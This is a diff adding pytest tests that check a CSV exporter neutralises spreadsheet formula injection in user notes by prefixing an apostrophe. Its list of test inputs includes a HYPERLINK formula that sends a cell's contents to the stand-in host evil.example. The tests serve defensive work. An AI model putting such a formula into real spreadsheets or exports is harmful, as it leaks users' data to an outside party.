@@ -13,11 +13,13 @@
 
 """Tests for CSV parsing and export."""
 
+import csv
+import io
 from datetime import date
 
 import pytest
 
-from app.csv_io import CsvRowError, export_csv, format_ddmyy, parse_csv, parse_ddmyy
+from app.csv_io import CsvRowError, export_csv, format_ddmyy, parse_csv, parse_ddmyy, protect_cell
 
 
 def test_parse_ddmyy_two_digit_year():
@@ -84,3 +86,61 @@ def test_export_csv_round_trips_through_parse():
     rows, errors = parse_csv(text)
     assert errors == []
     assert rows == [(date(2026, 9, 23), 79.7, "hi"), (date(2026, 9, 24), 80.0, None)]
+
+
+# --- notes that a spreadsheet would run as a formula ("CSV injection") ----------------------
+
+FORMULA_NOTES = [
+    "=HYPERLINK(\"http://evil.example/?\"&A1,\"click\")",
+    "+31 6 12345678",
+    "-2 kg this week",
+    "@SUM(A1:A9)",
+    "\t=1+1",
+    "\r=1+1",
+    "'=already quoted",
+    "''-two apostrophes",
+]
+PLAIN_NOTES = ["hi", "a=b", "2+2", "'just an apostrophe", "'", "emoji 😊 = happy"]
+
+
+class Entry:
+    def __init__(self, note, day=23):
+        self.entry_date = date(2026, 9, day)
+        self.weight = 80.0
+        self.note = note
+
+
+def exported_notes(notes):
+    text = export_csv([Entry(note, day) for day, note in enumerate(notes, start=1)])
+    return [row[2] for row in csv.reader(io.StringIO(text))]
+
+
+@pytest.mark.parametrize("note", FORMULA_NOTES)
+def test_a_note_that_looks_like_a_formula_is_exported_with_an_apostrophe(note):
+    (cell,) = exported_notes([note])
+    assert cell == "'" + note
+    assert cell[0] == "'"  # a spreadsheet shows it as text
+
+
+@pytest.mark.parametrize("note", PLAIN_NOTES)
+def test_other_notes_are_exported_unchanged(note):
+    assert exported_notes([note]) == [note]
+
+
+def test_every_note_survives_an_export_and_an_import():
+    notes = FORMULA_NOTES + PLAIN_NOTES
+    text = export_csv([Entry(note, day) for day, note in enumerate(notes, start=1)])
+    rows, errors = parse_csv(text)
+    assert errors == []
+    assert [note for _date, _weight, note in rows] == notes
+
+
+def test_no_exported_cell_starts_like_a_formula():
+    text = export_csv([Entry(note, day) for day, note in enumerate(FORMULA_NOTES + PLAIN_NOTES, start=1)])
+    for row in csv.reader(io.StringIO(text)):
+        for cell in row:
+            assert cell[:1] not in ("=", "+", "-", "@", "\t", "\r"), cell
+
+
+def test_protect_cell_leaves_the_empty_note_alone():
+    assert protect_cell("") == ""
